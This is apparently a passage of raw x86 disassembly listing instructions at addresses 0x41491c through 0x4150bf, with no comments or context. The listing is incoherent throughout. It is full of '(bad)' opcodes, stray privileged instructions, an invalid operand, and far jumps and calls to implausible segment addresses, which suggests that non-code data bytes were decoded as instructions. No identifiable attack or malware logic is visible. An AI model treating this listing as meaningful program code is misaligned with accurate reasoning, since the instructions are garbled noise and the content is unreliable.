  41491c:	retf   0xf08e
  41491f:	outs   dx,DWORD PTR ds:[esi]
  414920:	stos   DWORD PTR es:[edi],eax
  414921:	(bad)  
  414922:	mov    dh,0xef
  414924:	pop    ds
  414925:	sub    BYTE PTR [edi-0x5513c742],cl
  41492b:	test   al,0x74
  41492d:	pop    es
  41492e:	inc    edi
  41492f:	dec    eax
  414930:	adc    BYTE PTR [ecx-0x1237699b],dh
  414936:	push   edx
  414937:	loopne 0x4148f7
  414939:	icebp  
  41493a:	(bad)  
  41493b:	shl    BYTE PTR [eax+0x78],1
  41493e:	adc    bh,ah
  414940:	or     al,ch
  414942:	sub    DWORD PTR [edx],ebp
  414944:	dec    ecx
  414945:	xchg   edi,eax
  414946:	push   esp
  414947:	jbe    0x414951
  414949:	or     ah,BYTE PTR [eax+0x6fa2089c]
  41494f:	or     BYTE PTR [esp+ebx*2],ch
  414952:	adc    DWORD PTR [ecx-0x21],0x5124fd68
  414959:	fdivr  DWORD PTR [edx+0x5b]
  41495c:	inc    ecx
  41495d:	ds pushf 
  41495f:	test   BYTE PTR [eax-0x2a51b6f7],dh
  414965:	cmp    eax,0x63b14729
  41496a:	jmp    0x41491c
  41496c:	loop   0x414926
  41496e:	or     DWORD PTR [esi+0x440f9bfe],ebx
  414974:	pop    ebp
  414975:	ret    0x571
  414978:	jl     0x4149c6
  41497a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41497b:	sub    eax,0xd28b6553
  414980:	in     al,dx
  414981:	cmp    BYTE PTR [edx+0x6ce69586],bh
  414987:	push   ss
  414988:	test   eax,0x6f20c3d3
  41498d:	in     eax,0x9d
  41498f:	xchg   edi,eax
  414990:	or     eax,0xb6553484
  414995:	imul   ecx,edi,0xffffff92
  414998:	dec    esp
  414999:	pushf  
  41499a:	fst    QWORD PTR [ebx+0x3679b673]
  4149a0:	jg     0x414979
  4149a2:	dec    eax
  4149a3:	adc    eax,0xdd1f9d20
  4149a8:	jle    0x4149b9
  4149aa:	dec    ebp
  4149ab:	xor    eax,0xb1dc749f
  4149b0:	cli    
  4149b1:	sar    DWORD PTR [eax],cl
  4149b3:	into   
  4149b4:	xor    al,0x35
  4149b6:	mov    al,ds:0xdfc16d90
  4149bb:	in     al,0x8f
  4149bd:	and    ch,BYTE PTR [ecx+esi*1]
  4149c0:	pop    esp
  4149c1:	es dec edx
  4149c3:	cld    
  4149c4:	sbb    eax,0xaa9fbdfa
  4149c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ca:	xor    DWORD PTR [edx-0x54],eax
  4149cd:	mov    bl,0xa2
  4149cf:	icebp  
  4149d0:	popf   
  4149d1:	cli    
  4149d2:	test   BYTE PTR [eax+esi*4-0x7b],al
  4149d6:	add    al,BYTE PTR [edx+0x20]
  4149d9:	add    al,0x6b
  4149db:	in     al,dx
  4149dc:	ins    DWORD PTR es:[edi],dx
  4149dd:	test   eax,0xd9838b9e
  4149e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e3:	nop
  4149e4:	shl    DWORD PTR [ebx],0x8f
  4149e7:	rcl    DWORD PTR [ebp+0x16],cl
  4149ea:	add    ecx,DWORD PTR [eax+0x5ec7300b]
  4149f0:	mov    WORD PTR [ecx-0x4d82bd7a],fs
  4149f6:	jae    0x414a58
  4149f8:	icebp  
  4149f9:	mov    dl,0x6b
  4149fb:	pop    esi
  4149fc:	inc    edi
  4149fd:	and    eax,0x98aa9306
  414a02:	sbb    bh,BYTE PTR [ebx-0x10078d69]
  414a08:	mov    ebx,DWORD PTR [eax]
  414a0a:	mov    ebp,ecx
  414a0c:	adc    ebp,DWORD PTR [edi+0x61]
  414a0f:	mov    al,0x2a
  414a11:	inc    esp
  414a12:	popa   
  414a13:	ja     0x414a3f
  414a15:	add    edx,edi
  414a17:	sbb    esp,0x8f676ba5
  414a1d:	dec    eax
  414a1e:	ds xchg edx,eax
  414a20:	mov    ecx,0xdc860414
  414a25:	fmul   QWORD PTR [ecx+0x4a984593]
  414a2b:	(bad)  
  414a2c:	mov    eax,ds:0x79611a76
  414a31:	sar    DWORD PTR ds:0xab4d0349,cl
  414a37:	sbb    DWORD PTR [eax-0x2bded9a],esi
  414a3d:	push   ds
  414a3e:	das    
  414a3f:	cmc    
  414a40:	adc    BYTE PTR [esi-0x5f],dl
  414a43:	push   edx
  414a44:	or     edx,DWORD PTR [edx]
  414a46:	in     eax,0x9
  414a48:	push   esp
  414a49:	dec    esp
  414a4a:	dec    esp
  414a4b:	xchg   edi,eax
  414a4c:	jge    0x414a55
  414a4e:	icebp  
  414a4f:	loopne 0x414a85
  414a51:	ret    
  414a52:	sbb    ebp,ebx
  414a54:	and    BYTE PTR [edi+0x2265ce36],al
  414a5a:	pushf  
  414a5b:	ds (bad) 
  414a5d:	xor    BYTE PTR [eax+0x6a9676b6],bl
  414a63:	xchg   ebx,eax
  414a64:	arpl   WORD PTR [ebx+0x7f],dx
  414a67:	jg     0x414a67
  414a69:	adc    bh,BYTE PTR [edi+0x4a85af6e]
  414a6f:	fwait
  414a70:	mov    bl,0xc2
  414a72:	nop
  414a73:	cdq    
  414a74:	cwde   
  414a75:	ins    DWORD PTR es:[edi],dx
  414a76:	and    dh,BYTE PTR [ecx-0x474e4fc9]
  414a7c:	retf   
  414a7d:	or     dl,BYTE PTR [esi-0x48]
  414a80:	cwde   
  414a81:	es sub al,0x39
  414a84:	setb   BYTE PTR [ebx+ebx*1+0x13]
  414a89:	ret    
  414a8a:	fsubr  QWORD PTR [ebp+eax*4-0x5]
  414a8e:	je     0x414a9d
  414a90:	les    edx,FWORD PTR [esi-0x34ca2bd3]
  414a96:	dec    esi
  414a97:	arpl   WORD PTR [eax+0x4e],sp
  414a9a:	adc    eax,0x58c41f45
  414a9f:	sbb    eax,0xb092f1be
  414aa4:	mov    cl,0x47
  414aa6:	push   esi
  414aa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa8:	bound  esp,QWORD PTR [edi+0x4e997549]
  414aae:	jns    0x414a65
  414ab0:	ins    DWORD PTR es:[edi],dx
  414ab1:	sub    bl,al
  414ab3:	cmp    DWORD PTR [edx+eiz*1+0x20f77238],esp
  414aba:	sti    
  414abb:	mov    edi,0xc79995ec
  414ac0:	mov    ecx,0xc96c6aac
  414ac5:	push   cs
  414ac6:	lock or al,0x26
  414ac9:	dec    ecx
  414aca:	push   eax
  414acb:	pop    esi
  414acc:	and    BYTE PTR [eax+0x1b02cca5],dh
  414ad2:	mov    ?,WORD PTR [esi-0x6a6f0074]
  414ad8:	outs   dx,BYTE PTR ds:[esi]
  414ad9:	lods   al,BYTE PTR ds:[esi]
  414ada:	sub    eax,0xeb9b9da7
  414adf:	dec    esi
  414ae0:	stc    
  414ae1:	cli    
  414ae2:	inc    ecx
  414ae3:	or     al,0x6e
  414ae5:	push   ss
  414ae6:	and    al,0x1e
  414ae8:	jbe    0x414a6a
  414aea:	test   DWORD PTR [ebx],0x43eed5f1
  414af0:	sub    dh,ah
  414af2:	sub    al,0xdc
  414af4:	loope  0x414b31
  414af6:	xor    ebx,DWORD PTR [esi]
  414af8:	fild   QWORD PTR [edx+0x49e5d85]
  414afe:	mov    ebp,0xe877aa1d
  414b03:	xchg   edi,eax
  414b04:	xchg   esp,eax
  414b05:	int3   
  414b06:	fwait
  414b07:	jp     0x414aaa
  414b09:	call   0xbde0416b
  414b0e:	pop    esp
  414b0f:	rcl    DWORD PTR [ebx+ebx*1-0xd],cl
  414b13:	int3   
  414b14:	mov    al,0x5
  414b16:	jecxz  0x414b14
  414b18:	fiadd  WORD PTR [eax]
  414b1a:	clc    
  414b1b:	mov    bh,0x57
  414b1d:	mov    bh,0x7
  414b1f:	jl     0x414afb
  414b21:	jmp    0xb857:0xba0220b0
  414b28:	ss (bad) 
  414b2a:	pop    ebx
  414b2b:	or     al,0x0
  414b2d:	mov    ch,0x8c
  414b2f:	and    DWORD PTR [eax+0x58767941],ecx
  414b35:	pop    esi
  414b36:	icebp  
  414b37:	mov    ecx,0xb3ab1bfc
  414b3c:	jmp    0xbfd27b6b
  414b41:	pop    ebx
  414b42:	or     al,0x48
  414b44:	scas   al,BYTE PTR es:[edi]
  414b45:	js     0x414b0a
  414b47:	ror    DWORD PTR [edx],cl
  414b49:	pop    DWORD PTR [eax-0x4b69941a]
  414b4f:	dec    edi
  414b50:	icebp  
  414b51:	dec    edx
  414b52:	mov    ds:0xd0d3e170,eax
  414b57:	add    dl,al
  414b59:	faddp  st(2),st
  414b5b:	ficomp WORD PTR [edi*1-0x5b2aa46a]
  414b62:	cmp    BYTE PTR [edi+0x7b],al
  414b65:	mov    dh,0xd0
  414b67:	out    dx,al
  414b68:	ret    
  414b69:	stos   DWORD PTR es:[edi],eax
  414b6a:	inc    esi
  414b6b:	test   DWORD PTR [ecx+0x506a21cd],esi
  414b71:	adc    edx,DWORD PTR [esi+0x4cb714e1]
  414b77:	das    
  414b78:	stos   BYTE PTR es:[edi],al
  414b79:	inc    eax
  414b7a:	xor    cl,BYTE PTR [ecx]
  414b7c:	sub    al,BYTE PTR [ebp+0x6b]
  414b7f:	das    
  414b80:	xchg   esi,eax
  414b81:	cld    
  414b82:	iret   
  414b83:	pop    eax
  414b84:	loop   0x414bf3
  414b86:	sbb    al,0x1f
  414b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b89:	popf   
  414b8a:	call   0x27d28cd4
  414b8f:	inc    eax
  414b90:	or     DWORD PTR ds:0x8f793f28,esi
  414b96:	sub    bl,BYTE PTR [ecx+0x1c]
  414b99:	loopne 0x414b5e
  414b9b:	and    eax,0xbf79b890
  414ba0:	in     eax,0x3f
  414ba2:	dec    esi
  414ba3:	imul   edi,DWORD PTR [bx+si+0x1a41],0x78
  414ba9:	xor    ebx,0x83b5e499
  414baf:	ss cmp al,0x1
  414bb2:	add    eax,0x4855c3ec
  414bb7:	push   ss
  414bb8:	out    dx,eax
  414bb9:	enter  0x387f,0x7a
  414bbd:	jmp    0x60d3:0xcfa9f141
  414bc4:	push   0x6d
  414bc6:	push   0x494d903b
  414bcb:	hlt    
  414bcc:	(bad)  
  414bcd:	call   0x91b96395
  414bd2:	loopne 0x414c4b
  414bd4:	mul    BYTE PTR [edi+ebp*1+0x3f393d06]
  414bdb:	lods   eax,DWORD PTR ds:[esi]
  414bdc:	out    dx,eax
  414bdd:	ficomp WORD PTR [eax+0x6b7d5f33]
  414be3:	sbb    eax,0xee3002e9
  414be8:	popa   
  414be9:	(bad)  
  414bea:	mov    eax,ds:0xee31ebd6
  414bef:	jnp    0x414c11
  414bf1:	sub    BYTE PTR [edi-0x4d66e053],cl
  414bf7:	mov    DWORD PTR [eax-0x69],esi
  414bfa:	pop    es
  414bfb:	outs   dx,BYTE PTR ds:[esi]
  414bfc:	fsub   QWORD PTR [ecx+0x60]
  414bff:	push   ecx
  414c00:	sar    DWORD PTR [ecx-0x3ae10ccb],0xf3
  414c07:	mov    esi,0x34810df0
  414c0c:	push   ebx
  414c0d:	or     al,0x9e
  414c0f:	paddd  mm2,QWORD PTR [eax+0x78]
  414c13:	in     eax,dx
  414c14:	push   esp
  414c15:	daa    
  414c16:	mov    ebx,0xe833774
  414c1b:	fwait
  414c1c:	pop    ebx
  414c1d:	jmp    0x414bc1
  414c1f:	scas   al,BYTE PTR es:[edi]
  414c20:	mov    ds:0xaf02bdec,al
  414c25:	fst    DWORD PTR [ecx-0x487adb8c]
  414c2b:	xchg   ebx,eax
  414c2c:	test   al,0x53
  414c2e:	imul   esi,esp,0x47
  414c31:	test   al,0x50
  414c33:	xor    al,0xea
  414c35:	or     BYTE PTR [edx+edx*1+0x1a802fae],0xd8
  414c3d:	jo     0x414c79
  414c3f:	push   es
  414c40:	jecxz  0x414c18
  414c42:	test   BYTE PTR ds:0x9484e91a,cl
  414c48:	leave  
  414c49:	cmp    edi,DWORD PTR [ebp-0x72e3435]
  414c4f:	jl     0x414c91
  414c51:	les    ebp,FWORD PTR [edi]
  414c53:	jb     0x414ca3
  414c55:	xor    bl,BYTE PTR [eax]
  414c57:	push   ebp
  414c58:	cmp    eax,ebp
  414c5a:	push   0xac5868d9
  414c5f:	or     eax,edx
  414c61:	loope  0x414cca
  414c63:	jb     0x414c89
  414c65:	dec    ebp
  414c66:	fistp  WORD PTR [edi-0x283b4559]
  414c6c:	lock pop es
  414c6e:	pop    es
  414c6f:	add    eax,0x4828c17c
  414c74:	das    
  414c75:	test   eax,0x2998e10b
  414c7a:	cmp    al,0xb2
  414c7c:	sbb    eax,0x62d315e5
  414c81:	(bad)  [esi]
  414c83:	(bad)  
  414c84:	outs   dx,DWORD PTR ds:[esi]
  414c85:	xchg   edi,eax
  414c86:	sar    dl,0x78
  414c89:	mov    bl,0x76
  414c8b:	call   0x877ff5c1
  414c90:	and    al,0xda
  414c92:	sbb    ecx,DWORD PTR [eax-0x6615dca4]
  414c98:	pusha  
  414c99:	add    edi,esp
  414c9b:	or     BYTE PTR ds:0x7bc9d08a,dh
  414ca1:	push   eax
  414ca2:	aad    0x39
  414ca4:	sub    al,BYTE PTR [esi+0x56a62110]
  414caa:	fidivr WORD PTR [esi+0x777c042f]
  414cb0:	jmp    0x23dd:0x66fd28bb
  414cb7:	adc    al,0xbb
  414cb9:	test   DWORD PTR [eax+0x7a7eb97e],ecx
  414cbf:	push   ebp
  414cc0:	call   0x540b758e
  414cc5:	or     ebp,esp
  414cc7:	push   0xfffffff4
  414cc9:	lea    ebx,[edi-0x124dae20]
  414ccf:	std    
  414cd0:	fld    DWORD PTR [edi-0xc75b081]
  414cd6:	inc    esp
  414cd7:	cmp    cl,ah
  414cd9:	mov    edx,0x8d9bee72
  414cde:	jle    0x414c9f
  414ce0:	lea    eax,[eax+0x45]
  414ce3:	mov    edi,DWORD PTR es:[ebx]
  414ce6:	(bad)  
  414ce7:	xchg   edx,eax
  414ce8:	int3   
  414ce9:	pushf  
  414cea:	jnp    0x414cf8
  414cec:	sub    DWORD PTR [eax-0xe],edi
  414cef:	and    esi,DWORD PTR [edx-0x34]
  414cf2:	dec    ebp
  414cf3:	loopne 0x414cc0
  414cf5:	pop    ds
  414cf6:	dec    edi
  414cf7:	jle    0x414d03
  414cf9:	jb     0x414d42
  414cfb:	mov    esp,0xf0094924
  414d00:	dec    edx
  414d01:	sbb    al,0xf5
  414d03:	or     al,BYTE PTR [edi]
  414d05:	aaa    
  414d06:	pop    ebx
  414d07:	pop    es
  414d08:	dec    edx
  414d09:	enter  0x360e,0xd
  414d0d:	pop    es
  414d0e:	test   BYTE PTR [esi+0x64],dl
  414d11:	adc    cl,bh
  414d13:	mov    ah,0xda
  414d15:	pop    edx
  414d16:	push   cs
  414d17:	push   cs
  414d18:	inc    edi
  414d19:	cmp    esp,esp
  414d1b:	adc    ecx,DWORD PTR [eax+0x21]
  414d1e:	fcomp  QWORD PTR [eax+0x481be855]
  414d24:	daa    
  414d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d26:	push   cs
  414d27:	adc    ebp,DWORD PTR [edx]
  414d29:	je     0x414cf4
  414d2b:	(bad)  
  414d2d:	cmp    edi,edx
  414d2f:	mov    al,0x80
  414d31:	(bad)  
  414d32:	xor    DWORD PTR [ebp+0x28],edx
  414d35:	add    ah,BYTE PTR [esi+0x54519ed0]
  414d3b:	sar    al,0xb7
  414d3e:	stos   DWORD PTR es:[edi],eax
  414d3f:	mov    bl,0xf8
  414d41:	cwde   
  414d42:	jmp    0xbf8cda39
  414d47:	jl     0x414d82
  414d49:	arpl   WORD PTR [eax-0x7f],cx
  414d4c:	in     al,0x82
  414d4e:	dec    esp
  414d4f:	jae    0x414d0f
  414d51:	and    esp,eax
  414d53:	nop
  414d54:	repz pushf 
  414d56:	loop   0x414d70
  414d58:	outs   dx,BYTE PTR fs:[esi]
  414d5a:	repnz push esp
  414d5c:	in     al,dx
  414d5d:	int    0x5c
  414d5f:	cwde   
  414d60:	retf   0xe96
  414d63:	push   ds
  414d64:	pop    ebp
  414d66:	inc    ebp
  414d67:	dec    edx
  414d68:	pop    esp
  414d69:	sub    cl,al
  414d6b:	xor    BYTE PTR [edx-0x5c],dh
  414d6e:	mov    BYTE PTR [ebx],ah
  414d70:	adc    cl,BYTE PTR [ebx]
  414d72:	iret   
  414d73:	push   esi
  414d74:	into   
  414d75:	and    eax,0x47a0a2cb
  414d7a:	jg     0x414d2e
  414d7c:	mov    esi,0x700cff18
  414d81:	add    al,0xdf
  414d83:	xor    al,0x76
  414d85:	fisttp DWORD PTR [eax*8+0x71d1015b]
  414d8c:	pop    ecx
  414d8d:	dec    esp
  414d8e:	push   edx
  414d8f:	clc    
  414d90:	lods   eax,DWORD PTR ds:[esi]
  414d91:	dec    edi
  414d92:	adc    eax,0x7bdda7cf
  414d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d98:	dec    ecx
  414d99:	inc    ebp
  414d9a:	inc    edi
  414d9b:	call   0xe2b3:0x5a5deba9
  414da2:	ret    
  414da3:	sub    DWORD PTR [edi-0x57],eax
  414da6:	js     0x414df0
  414da8:	mov    DWORD PTR [eax],eax
  414daa:	jp     0x414dc4
  414dac:	mov    ds:0x97d05899,al
  414db1:	lods   al,BYTE PTR ds:[esi]
  414db2:	add    al,0xa
  414db4:	outs   dx,DWORD PTR ds:[esi]
  414db5:	xchg   esp,eax
  414db6:	adc    eax,0x2e73f517
  414dbb:	xor    edx,DWORD PTR [edi]
  414dbd:	popa   
  414dbe:	pop    ss
  414dbf:	add    ecx,DWORD PTR [edi+0xd]
  414dc2:	pop    edi
  414dc3:	out    0x22,eax
  414dc5:	stos   BYTE PTR es:[edi],al
  414dc6:	(bad)  
  414dc7:	subps  xmm0,XMMWORD PTR ds:0xabb35096
  414dce:	inc    ecx
  414dcf:	xchg   edi,eax
  414dd0:	jne    0x414d8e
  414dd2:	mov    cs,ebp
  414dd4:	aas    
  414dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dd6:	ds pop ss
  414dd8:	rol    BYTE PTR [ebx+0x45],0x5a
  414ddc:	mov    ah,0xa6
  414dde:	das    
  414ddf:	rol    DWORD PTR [edx+0x7d],0x78
  414de3:	data16 ror dh,0xed
  414de7:	mov    ebp,0x74c7e287
  414dec:	not    DWORD PTR [edi]
  414dee:	push   esp
  414def:	(bad)  
  414df1:	out    0xbd,eax
  414df3:	pop    esp
  414df4:	loope  0x414dd2
  414df6:	mov    edx,0xb2caa276
  414dfb:	clc    
  414dfc:	jl     0x414da3
  414dfe:	lods   al,BYTE PTR ds:[esi]
  414dff:	clc    
  414e00:	retf   
  414e01:	sub    al,0x3
  414e03:	push   edi
  414e04:	or     DWORD PTR [ebp+esi*4+0x7ef62956],esp
  414e0b:	sbb    ch,BYTE PTR [edx+ecx*8+0x33]
  414e0f:	mov    esp,0x2342065f
  414e14:	mov    edi,0x8f75068a
  414e19:	out    0xaa,al
  414e1b:	mov    edi,0xfa7a7b94
  414e20:	frstor [esi+0x4f]
  414e23:	add    ebp,ecx
  414e25:	xchg   ebx,eax
  414e26:	(bad)  
  414e27:	adc    eax,0x1ee891d1
  414e2c:	mov    ebp,ds
  414e2e:	aas    
  414e2f:	pop    es
  414e30:	xchg   esi,eax
  414e31:	xor    bh,ch
  414e33:	sbb    bl,BYTE PTR [edi]
  414e35:	adc    eax,DWORD PTR [eax+0x7]
  414e38:	pop    ebp
  414e39:	xchg   ecx,eax
  414e3a:	sbb    dl,BYTE PTR [ebp-0x40cf131a]
  414e40:	xlat   BYTE PTR ds:[ebx]
  414e41:	sbb    al,0x2d
  414e43:	xchg   ebx,eax
  414e44:	leave  
  414e45:	nop
  414e46:	sub    BYTE PTR [eax+ebx*4-0x1a],cl
  414e4a:	mov    dl,0xa8
  414e4c:	(bad)  
  414e4d:	into   
  414e4e:	inc    esi
  414e4f:	test   DWORD PTR [ebx+0x4],edx
  414e52:	mov    DWORD PTR [edx+0xa],0x5a42e45c
  414e59:	call   0x6e6b:0x70042817
  414e60:	daa    
  414e61:	cld    
  414e62:	in     eax,dx
  414e63:	scas   al,BYTE PTR es:[edi]
  414e64:	cmp    dh,bl
  414e66:	mov    al,0xe
  414e68:	sub    al,0x4d
  414e6a:	sbb    BYTE PTR [edx-0x4c2359b],dh
  414e70:	stos   DWORD PTR es:[edi],eax
  414e71:	cmp    al,0xf2
  414e73:	sbb    DWORD PTR [edx],edi
  414e75:	mov    esp,0xb30557
  414e7a:	xchg   esi,eax
  414e7b:	jmp    0x414ea8
  414e7d:	jle    0x414ed1
  414e7f:	cld    
  414e80:	das    
  414e81:	fimul  DWORD PTR [ebx]
  414e83:	sar    DWORD PTR [edx+0x41e8510e],cl
  414e89:	sbb    ebp,DWORD PTR [edx-0x2d]
  414e8c:	stos   BYTE PTR es:[edi],al
  414e8d:	jb     0x414e5b
  414e8f:	adc    bh,0x1d
  414e92:	sar    BYTE PTR ds:0xdb816f55,1
  414e98:	popa   
  414e99:	test   eax,0x8a49e8b
  414e9e:	fs js  0x414e9f
  414ea1:	jno    0x414ee8
  414ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ea4:	inc    esi
  414ea5:	aaa    
  414ea6:	mov    ch,0xf1
  414ea9:	pop    ss
  414eaa:	clc    
  414eab:	outs   dx,DWORD PTR ds:[esi]
  414eac:	(bad)  
  414ead:	rol    DWORD PTR ds:[ecx-0xe],cl
  414eb1:	sub    DWORD PTR [edi-0x1ba71989],0x38ec62b5
  414ebb:	ds pop ds
  414ebd:	xchg   esp,eax
  414ebe:	mov    ah,dh
  414ec0:	dec    ecx
  414ec1:	int    0xa9
  414ec3:	or     eax,0x9bdb57a1
  414ec8:	xchg   ebp,eax
  414ec9:	cmc    
  414eca:	rcl    DWORD PTR [eax+ebp*2],cl
  414ecd:	repnz daa 
  414ecf:	aas    
  414ed0:	bound  eax,QWORD PTR [edx-0x68fe84c]
  414ed6:	pop    edx
  414ed7:	dec    edx
  414ed8:	push   ebp
  414ed9:	daa    
  414eda:	or     cl,BYTE PTR [ecx]
  414edc:	jle    0x414e6b
  414ede:	test   eax,0xc77c3c02
  414ee3:	iret   
  414ee4:	jmp    0xedec:0x6e43d62d
  414eeb:	add    BYTE PTR [esp+esi*1+0x1a93373a],ch
  414ef2:	(bad)  
  414ef4:	pusha  
  414ef5:	ins    DWORD PTR es:[edi],dx
  414ef6:	repnz and bh,bl
  414ef9:	and    eax,ebp
  414efb:	or     BYTE PTR [ecx+0x44],0xa2
  414eff:	fcmovb st,st(3)
  414f01:	pop    esi
  414f02:	ins    BYTE PTR es:[edi],dx
  414f03:	cmp    ch,BYTE PTR [ecx+0x5cda7]
  414f09:	dec    edx
  414f0a:	loopne 0x414f2f
  414f0c:	test   al,0xb6
  414f0e:	in     al,dx
  414f0f:	mov    ds:0x7c5f29df,eax
  414f14:	fsubr  QWORD PTR [ecx]
  414f16:	inc    esi
  414f17:	dec    esp
  414f18:	xor    dh,bl
  414f1a:	in     al,dx
  414f1b:	push   ds
  414f1c:	mov    eax,ds:0x9d0b26e9
  414f21:	cwde   
  414f22:	jge    0x414f43
  414f24:	test   DWORD PTR [esi-0x55],ebp
  414f27:	lock and dl,al
  414f2a:	repnz shr DWORD PTR fs:[esi+edx*4],0xc4
  414f30:	xor    al,0x5d
  414f32:	sti    
  414f33:	mov    dl,0x70
  414f35:	fistp  QWORD PTR [edx]
  414f37:	arpl   WORD PTR [edi],bp
  414f39:	nop
  414f3a:	das    
  414f3b:	pop    ebx
  414f3c:	dec    ebp
  414f3d:	push   eax
  414f3e:	xor    DWORD PTR [ecx+0x28],ecx
  414f41:	adc    al,0x8
  414f43:	mov    ah,cl
  414f45:	popa   
  414f46:	mov    ebp,0xc3d17a95
  414f4b:	bound  esi,QWORD PTR [edx-0x17]
  414f4e:	test   eax,0x49e3bac6
  414f53:	sar    BYTE PTR [ebx+0x46],cl
  414f56:	dec    esp
  414f57:	cwde   
  414f58:	popf   
  414f59:	(bad)  
  414f5b:	cli    
  414f5c:	adc    BYTE PTR [eax],bh
  414f5e:	(bad)  [ecx-0x44]
  414f61:	sub    al,0x93
  414f63:	or     esi,0xffffff91
  414f66:	sub    DWORD PTR [edi+ecx*8],0x3b054016
  414f6d:	sub    BYTE PTR [edx],dh
  414f6f:	icebp  
  414f70:	xor    eax,0x79013885
  414f75:	mov    ah,0x58
  414f77:	stos   BYTE PTR es:[edi],al
  414f78:	jo     0x414f2d
  414f7a:	mov    esi,0x44c80423
  414f7f:	icebp  
  414f80:	mov    cs,WORD PTR [esi]
  414f82:	jbe    0x414fb4
  414f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f85:	or     ecx,DWORD PTR [ebx+ecx*4-0x4e]
  414f89:	mov    edi,0x4244578f
  414f8e:	adc    DWORD PTR [ebp-0x5d170e3b],edx
  414f94:	iret   
  414f95:	out    dx,al
  414f96:	xchg   ebx,eax
  414f97:	mov    eax,ds:0xae17c283
  414f9c:	add    dh,ch
  414f9e:	mov    ebx,0xfe0c7a1f
  414fa3:	dec    eax
  414fa4:	pop    ebp
  414fa5:	push   edi
  414fa6:	xor    edx,esi
  414fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fa9:	out    dx,al
  414faa:	dec    esi
  414fab:	data16 mov ch,dl
  414fae:	mov    al,ds:0x2770aa8b
  414fb4:	and    al,0x8f
  414fb6:	and    DWORD PTR [edx+0x5c],edi
  414fb9:	add    bh,BYTE PTR ds:0xc67699ca
  414fbf:	out    dx,al
  414fc0:	repz (bad) 
  414fc2:	repz sti 
  414fc4:	sub    BYTE PTR [ecx-0x52],dh
  414fc7:	mov    WORD PTR [ecx],ss
  414fc9:	out    dx,al
  414fca:	ret    0x394c
  414fcd:	add    ch,BYTE PTR [ebx+edi*4-0xf2d1959]
  414fd4:	or     ah,al
  414fd6:	rcr    BYTE PTR [eax+0x692f3d7c],cl
  414fdc:	dec    eax
  414fdd:	std    
  414fde:	pop    edx
  414fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fe0:	jmp    0x7601e97f
  414fe5:	repz cwde 
  414fe7:	inc    eax
  414fe8:	pop    ecx
  414fe9:	pop    edx
  414fea:	xor    al,0xb0
  414fec:	cmp    edi,ebx
  414fee:	pop    es
  414fef:	push   edi
  414ff0:	shl    BYTE PTR [esi+0x77],cl
  414ff3:	add    eax,0x4d1576f5
  414ff8:	into   
  414ff9:	(bad)  
  414ffb:	scas   al,BYTE PTR es:[edi]
  414ffc:	xchg   edx,eax
  414ffd:	ja     0x415057
  414fff:	mov    eax,0xd644d6f6
  415004:	aas    
  415005:	pop    eax
  415006:	mov    BYTE PTR [ecx+0x30],al
  415009:	sbb    eax,0x4d
  41500c:	sahf   
  41500d:	sub    DWORD PTR ds:0x8799dfc1,ebx
  415013:	fistp  DWORD PTR [edi+0x7d]
  415016:	cmp    BYTE PTR cs:[eax-0x37],dl
  41501a:	inc    esp
  41501b:	fs mov bl,0xf7
  41501e:	mov    bl,0x73
  415020:	outs   dx,BYTE PTR ds:[esi]
  415021:	clc    
  415022:	xchg   edx,eax
  415023:	and    eax,0x4ae4fdc1
  415028:	add    al,0x77
  41502a:	xchg   ebp,eax
  41502b:	xor    al,0x80
  41502d:	pop    edi
  41502e:	add    BYTE PTR [esi+0x21],0xe3
  415032:	std    
  415033:	mov    dl,ah
  415035:	mov    al,0x11
  415037:	cwde   
  415038:	retf   
  415039:	jne    0x4150af
  41503b:	push   ss
  41503c:	fbstp  TBYTE PTR [esi-0x2ab1c66]
  415042:	dec    ecx
  415043:	ficom  WORD PTR [edx]
  415045:	aad    0x3e
  415047:	pop    ss
  415048:	add    eax,0x8c1c680a
  41504d:	pop    edi
  41504e:	test   bh,0x46
  415051:	inc    ecx
  415052:	loop   0x4150c8
  415054:	lods   al,BYTE PTR ds:[esi]
  415055:	les    esi,FWORD PTR [esi-0xeb6c013]
  41505b:	into   
  41505c:	pop    edx
  41505d:	enter  0x70ff,0x10
  415061:	jno    0x4150b1
  415063:	cs adc eax,0x203f3219
  415069:	sbb    al,0x3b
  41506b:	inc    edx
  41506c:	cmp    DWORD PTR [ebp-0x461750c7],0x830239e2
  415076:	loop   0x415062
  415078:	movq   mm5,mm2
  41507b:	imul   DWORD PTR [edx]
  41507d:	fisub  DWORD PTR [ebx]
  41507f:	and    DWORD PTR [esi-0x80ad308],eax
  415085:	arpl   WORD PTR [edi],dx
  415087:	pop    edx
  415088:	xor    bl,BYTE PTR [esi+0x41]
  41508b:	push   ds
  41508c:	mov    al,0x48
  41508e:	lds    ebx,FWORD PTR [eax]
  415090:	scas   eax,DWORD PTR es:[edi]
  415091:	pop    ebp
  415092:	into   
  415093:	hlt    
  415094:	jns    0x4150b3
  415096:	mov    dl,0x63
  415098:	pop    eax
  415099:	dec    ebp
  41509a:	jno    0x41507f
  41509c:	test   DWORD PTR [esi-0x71],esi
  41509f:	pop    ebx
  4150a0:	mov    ecx,DWORD PTR [ecx]
  4150a2:	cmp    bh,BYTE PTR [ecx]
  4150a4:	mov    eax,ds:0xa7461854
  4150a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150aa:	and    al,0x97
  4150ac:	inc    esi
  4150ad:	(bad)  
  4150ae:	push   esi
  4150af:	push   es
  4150b0:	hlt    
  4150b1:	cld    
  4150b2:	les    ebx,FWORD PTR [esi]
  4150b4:	or     ebp,esp
  4150b6:	xlat   BYTE PTR ds:[ebx]
  4150b7:	scas   al,BYTE PTR es:[edi]
  4150b8:	pop    edi
  4150b9:	xor    esi,DWORD PTR [ebp-0x3318c983]
  4150bf:	rol    DWORD PTR [ecx],1
